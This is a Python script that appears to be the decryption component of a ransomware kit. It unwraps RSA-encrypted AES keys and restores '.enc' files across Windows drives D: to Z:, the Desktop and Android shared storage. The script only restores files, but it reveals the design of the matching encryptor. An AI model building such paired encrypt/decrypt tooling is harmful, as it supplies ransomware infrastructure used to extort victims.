import os
import ctypes
import platform
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import unpad

# Path to the private key
private_key_path = "private.pem"

# Load RSA Private Key
with open(private_key_path, "rb") as key_file:
    private_key_data = key_file.read()
private_key = RSA.import_key(private_key_data)
cipher_rsa = PKCS1_OAEP.new(private_key)

# Function to decrypt a file
def decrypt_file(file_path, cipher_rsa):
    try:
        with open(file_path, "rb") as f:
            iv = f.read(16)
            encrypted_aes_key = f.read(256)
            encrypted_data = f.read()

        aes_key = cipher_rsa.decrypt(encrypted_aes_key)
        cipher_aes = AES.new(aes_key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher_aes.decrypt(encrypted_data), AES.block_size)

        original_file_path = file_path.replace(".enc", "")
        with open(original_file_path, "wb") as f:
            f.write(decrypted_data)

        os.remove(file_path)
        print(f"Decrypted: {file_path}")
    except Exception as e:
        print(f"Failed to decrypt {file_path}: {e}")

# Function to decrypt a directory, handling both PC and Android
def decrypt_directory(directory, cipher_rsa):
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(".enc"):
                file_path = os.path.join(root, file)
                decrypt_file(file_path, cipher_rsa)

# Check if we are running on a PC or Mobile
if platform.system() == "Windows":
    # Decrypt all drives except C: and the Desktop folder
    drives = [d + ":\\" for d in "DEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(d + ":\\")]
    drives.append(os.path.expanduser("~/Desktop"))
    
    for drive in drives:
        decrypt_directory(drive, cipher_rsa)

elif platform.system() == "Linux":
    # Decrypt `/storage/emulated/0` on Android
    decrypt_directory("/storage/emulated/0", cipher_rsa)

print("Decryption Complete! All files restored.")
